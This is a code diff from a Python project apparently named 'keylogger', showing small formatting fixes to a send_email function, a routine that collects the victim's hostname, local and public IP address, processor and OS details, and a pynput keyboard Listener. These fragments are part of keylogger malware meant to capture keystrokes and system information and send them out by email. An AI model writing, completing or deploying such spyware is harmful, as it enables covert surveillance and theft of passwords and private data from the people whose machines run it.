@@ -40,8 +40,7 @@ file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"
 
 extend = "\\"
 
-def send_email(filename, attachment, toaddr):filename
-
+def send_email(filename, attachment, toaddr):
     fromaddr = email_address
 
     msg = MIMEMultipart()
@@ -89,10 +88,10 @@ def computer_information():
         IPAddr = socket.gethostbyname(hostname)
         try:
             public_ip = get('https://api.ipify.org').text
-            f.write("Public IP Address: " + public_ip)
+            f.write("Public IP Address: " + public_ip + '\n')
 
         except Exception:
-            f.write("Public IP Address: None")
+            f.write("Public IP Address: None" + '\n')
 
         f.write("Processor : " + (platform.processor()) + '\n')
         f.write("System  : " + platform.system() + " " + platform.version() + '\n')
@@ -129,4 +128,3 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
